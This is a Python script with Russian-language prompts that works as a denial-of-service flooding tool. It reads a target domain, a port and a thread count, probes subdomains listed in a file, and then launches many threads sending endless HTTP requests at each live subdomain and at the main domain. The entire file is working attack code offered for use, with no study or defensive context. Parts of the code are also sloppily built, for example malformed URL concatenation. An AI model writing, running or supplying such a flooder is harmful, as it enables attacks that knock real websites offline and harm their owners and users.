print('Загрузка...')
import os
import time
import threading
try:
    import requests
except:
    os.system('pip install requests')
try:
    import colorama
except:
    os.system('pip install colorama')
if os.sys.platform == 'win32':
    def clear():
        os.system('cls')
else:
    def clear():
        os.system('clear')
clear()
def dos(target, port):
    while True:
        try:
            res = requests.get(target + ":" + port)
            print(colorama.Fore.RED + "[+]" +colorama.Fore.YELLOW + "Запрос отправлен!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка подключения!" + colorama.Fore.WHITE)
            time.sleep(0.1)

threads = 20

url = input(colorama.Fore.BLUE + "Домен: "+ colorama.Fore.YELLOW)
port = input(colorama.Fore.BLUE + "Порт: " + colorama.Fore.YELLOW)

try:
    threads = int(input(colorama.Fore.BLUE + "Количество потоков: " + colorama.Fore.YELLOW))
except ValueError:
    exit(colorama.Fore.RED + "Неверное количество потоков!")

if threads == 0:
    exit(colorama.Fore.RED + "Неверное количество потоков!")

if not url.__contains__("."):
    exit(colorama.Fore.RED + "Неверный домен")

subd = open('subd.txt', 'r')
subd = subd.read()
sub = []
l = ''
subb = []

for j in subd:
    if not j == '\n':
        l = l + j
    else:
        sub.append(l)

for k in sub:
    try:
        requests.get('https://' + k + '.' + url + port)
        ex = False
    except:
        ex = True
    if ex == False:
        subb.append(k)

for h in subb:
    print(colorama.Fore.RED + "[+]" + colorama.Fore.LIGHTGREEN_EX + " Запускаю атаку на домен " + h + '.' + url)
    for d in range(0, threads):
        thr = threading.Thread(target=dos, args=(h + '.' + url, port,))
        thr.start()
    print(colorama.Fore.RED + "[+]" + colorama.Fore.LIGHTGREEN_EX + " Атака на домен " + h + '.' + url + " запущена")

for i in range(0, threads):
    print(colorama.Fore.RED + "[+]" + colorama.Fore.LIGHTGREEN_EX + " Запускаю атаку на основной домен")
    thr = threading.Thread(target=dos, args=('https://' + url, port,))
    thr.start()
print(colorama.Fore.RED + "[+]" + colorama.Fore.LIGHTGREEN_EX + " Атака на основной домен запущена")
print(colorama.Fore.RED + "[+]" + colorama.Fore.LIGHTGREEN_EX + " DoS атака запущена, ждите")
